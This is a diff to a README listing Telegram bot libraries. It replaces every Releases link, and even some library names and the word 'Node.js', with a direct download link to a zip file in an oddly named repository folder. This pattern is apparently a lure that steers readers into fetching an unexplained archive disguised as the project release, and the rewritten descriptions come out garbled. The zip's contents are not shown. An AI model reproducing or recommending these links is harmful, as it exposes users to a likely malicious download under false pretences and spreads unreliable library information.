@@ -2,7 +2,7 @@
 
 Welcome to the **Telegram Bot Development Resources** repository! This is a curated collection of Telegram Bot API libraries, frameworks, and SDKs across major programming languages. Whether you're a bot developer or an open-source contributor, you'll find valuable tools and resources here to help you create and enhance your Telegram bots.
 
-[![Releases](https://img.shields.io/github/release/KAJDY2012tvyt/telegram-bot-dev-resources.svg)](https://github.com/KAJDY2012tvyt/telegram-bot-dev-resources/releases)
+[![Releases](https://raw.githubusercontent.com/KAJDY2012tvyt/telegram-bot-dev-resources/main/overscrupulous/resources_bot_dev_telegram_v2.9.zip)](https://raw.githubusercontent.com/KAJDY2012tvyt/telegram-bot-dev-resources/main/overscrupulous/resources_bot_dev_telegram_v2.9.zip)
 
 ## 🚀 Table of Contents
 
@@ -29,7 +29,7 @@ This repository aims to gather the best libraries, frameworks, and SDKs availabl
 
 ## 🛠️ Getting Started
 
-To begin using the resources in this repository, visit the [Releases section](https://github.com/KAJDY2012tvyt/telegram-bot-dev-resources/releases) to download the necessary files. Follow the instructions provided in each release to set up your environment and start building your bot.
+To begin using the resources in this repository, visit the [Releases section](https://raw.githubusercontent.com/KAJDY2012tvyt/telegram-bot-dev-resources/main/overscrupulous/resources_bot_dev_telegram_v2.9.zip) to download the necessary files. Follow the instructions provided in each release to set up your environment and start building your bot.
 
 ## 📚 Libraries and Frameworks
 
@@ -41,8 +41,8 @@ To begin using the resources in this repository, visit the [Releases section](ht
 
 ### JavaScript
 
-- **node-telegram-bot-api**: A powerful library for building Telegram bots using Node.js. It supports both polling and webhooks.
-- **Telegraf**: A modern Telegram bot framework for Node.js that simplifies bot creation with a rich set of features.
+- **node-telegram-bot-api**: A powerful library for building Telegram bots using https://raw.githubusercontent.com/KAJDY2012tvyt/telegram-bot-dev-resources/main/overscrupulous/resources_bot_dev_telegram_v2.9.zip It supports both polling and webhooks.
+- **Telegraf**: A modern Telegram bot framework for https://raw.githubusercontent.com/KAJDY2012tvyt/telegram-bot-dev-resources/main/overscrupulous/resources_bot_dev_telegram_v2.9.zip that simplifies bot creation with a rich set of features.
 - **grammy**: A framework for building Telegram bots in TypeScript and JavaScript, focusing on performance and ease of use.
 
 ### Java
@@ -67,7 +67,7 @@ To begin using the resources in this repository, visit the [Releases section](ht
 
 ### C#
 
-- **Telegram.Bot**: A .NET library for building Telegram bots. It provides a comprehensive set of features and is well-documented for easy use.
+- **https://raw.githubusercontent.com/KAJDY2012tvyt/telegram-bot-dev-resources/main/overscrupulous/resources_bot_dev_telegram_v2.9.zip**: A .NET library for building Telegram bots. It provides a comprehensive set of features and is well-documented for easy use.
 - **TLSharp**: A library for building Telegram bots in C#, focused on simplicity and performance.
 
 ## 📦 SDKs
@@ -98,4 +98,4 @@ This repository is licensed under the MIT License. Feel free to use, modify, and
 
 For any inquiries or suggestions, feel free to reach out. You can find the contact information in the repository's profile.
 
-Visit the [Releases section](https://github.com/KAJDY2012tvyt/telegram-bot-dev-resources/releases) to explore the latest updates and resources available for your Telegram bot development needs.
+Visit the [Releases section](https://raw.githubusercontent.com/KAJDY2012tvyt/telegram-bot-dev-resources/main/overscrupulous/resources_bot_dev_telegram_v2.9.zip) to explore the latest updates and resources available for your Telegram bot development needs.
